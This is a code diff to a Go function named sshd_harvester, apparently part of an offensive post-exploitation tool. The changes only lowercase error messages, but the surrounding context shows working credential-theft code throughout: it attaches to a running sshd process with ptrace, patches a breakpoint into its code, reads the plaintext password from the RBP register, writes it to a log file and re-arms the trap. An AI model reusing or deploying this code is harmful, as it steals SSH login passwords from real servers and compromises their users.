@@ -89,19 +89,19 @@ func sshd_harvester(pid int, password_file string) {
 			strings.Contains(line, "r-x") {
 			f1 := strings.Fields(line)[0]
 			if len(f1) < 2 {
-				util.LogFilePrintf(password_file, "Error parsing line: %s", line)
+				util.LogFilePrintf(password_file, "error parsing line: %s", line)
 				continue
 			}
 			start := strings.Split(f1, "-")[0]
 			end := strings.Split(f1, "-")[1]
 			ptr, err = strconv.ParseUint(start, 16, 64)
 			if err != nil {
-				util.LogFilePrintf(password_file, "Parsing pstart: %v", err)
+				util.LogFilePrintf(password_file, "parsing pstart: %v", err)
 				return
 			}
 			pend, err = strconv.ParseUint(end, 16, 64)
 			if err != nil {
-				util.LogFilePrintf(password_file, "Parsing pend: %v", err)
+				util.LogFilePrintf(password_file, "parsing pend: %v", err)
 				return
 			}
 		}
@@ -117,7 +117,7 @@ func sshd_harvester(pid int, password_file string) {
 	defer runtime.UnlockOSThread()
 	err = unix.PtraceAttach(pid)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Failed to attach to %d: %v", pid, err)
+		util.LogFilePrintf(password_file, "failed to attach to %d: %v", pid, err)
 		return
 	}
 	defer unix.PtraceDetach(pid)
@@ -129,7 +129,7 @@ func sshd_harvester(pid int, password_file string) {
 	for ptr < pend {
 		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
 		if err != nil {
-			util.LogFilePrintf(password_file, "PTRACE_PEEKTEXT Searching memory of %d: %v",
+			util.LogFilePrintf(password_file, "PTRACE_PEEKTEXT searching memory of %d: %v",
 				pid, err)
 			time.Sleep(time.Second)
 		}
@@ -141,7 +141,7 @@ func sshd_harvester(pid int, password_file string) {
 		ptr++
 	}
 	if ptr == pend {
-		util.LogFilePrintf(password_file, "Code pattern 0x%x not found in memory 0x%x to 0x%x",
+		util.LogFilePrintf(password_file, "code pattern 0x%x not found in memory 0x%x to 0x%x",
 			code_pattern_bigendian, pstart, pend)
 		return
 	}
@@ -161,7 +161,7 @@ func sshd_harvester(pid int, password_file string) {
 	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern_bigendian, code_with_trap)
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Patching code: %v", err)
+		util.LogFilePrintf(password_file, "patching code: %v", err)
 		return
 	}
 	util.LogFilePrintf(password_file, "INT3 written, breakpoint set")
@@ -169,13 +169,13 @@ func sshd_harvester(pid int, password_file string) {
 	log.Println("Resuming process to let it hit breakpoint")
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogFilePrintf(password_file, "Resuming process: %v", err)
+		util.LogFilePrintf(password_file, "resuming process: %v", err)
 		return
 	}
 	wstatus := new(unix.WaitStatus)
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Wait %d to hit breakpoint: %v", pid, err)
+		util.LogFilePrintf(password_file, "wait %d to hit breakpoint: %v", pid, err)
 		return
 	}
 
@@ -189,7 +189,7 @@ handler:
 	regs := new(unix.PtraceRegs)
 	err = unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Get regs: %v", err)
+		util.LogFilePrintf(password_file, "get regs: %v", err)
 		return
 	}
 	password_reg := regs.Rbp
@@ -202,7 +202,7 @@ handler:
 	for {
 		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
 		if err != nil {
-			util.LogFilePrintf(password_file, "Reading password from RBP (0x%x): %v", password_reg, err)
+			util.LogFilePrintf(password_file, "reading password from RBP (0x%x): %v", password_reg, err)
 			return
 		}
 		// until NULL is reached
@@ -223,25 +223,25 @@ handler:
 	log.Println("Removing breakpoint")
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern_bigendian)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Restoring code to remove breakpoint: %v", err)
+		util.LogFilePrintf(password_file, "restoring code to remove breakpoint: %v", err)
 		return
 	}
 	// one byte back, go back before 0xCC, at the start of code pattern
 	regs.Rip--
 	err = unix.PtraceSetRegs(pid, regs)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Set regs back: %v", err)
+		util.LogFilePrintf(password_file, "set regs back: %v", err)
 		return
 	}
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Single step: %v", err)
+		util.LogFilePrintf(password_file, "single step: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Wait %d to single step: %v", pid, err)
+		util.LogFilePrintf(password_file, "wait %d to single step: %v", pid, err)
 		return
 	}
 	log.Println("Single step done")
@@ -253,7 +253,7 @@ handler:
 	// add breakpoint back
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Patching code: %v", err)
+		util.LogFilePrintf(password_file, "patching code: %v", err)
 		return
 	}
 	util.LogFilePrintf(password_file, "Added breakpoint back")
@@ -261,12 +261,12 @@ handler:
 	// continue sshd session process
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogFilePrintf(password_file, "Continue SSHD session: %v", err)
+		util.LogFilePrintf(password_file, "continue SSHD session: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Wait %d to continue: %v", pid, err)
+		util.LogFilePrintf(password_file, "wait %d to continue: %v", pid, err)
 		return
 	}
 	switch {
@@ -281,7 +281,7 @@ handler:
 	case wstatus.Continued():
 		util.LogFilePrintf(password_file, "SSHD %d core continues...", pid)
 	default:
-		util.LogFilePrintf(password_file, "Uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
+		util.LogFilePrintf(password_file, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
 }
 
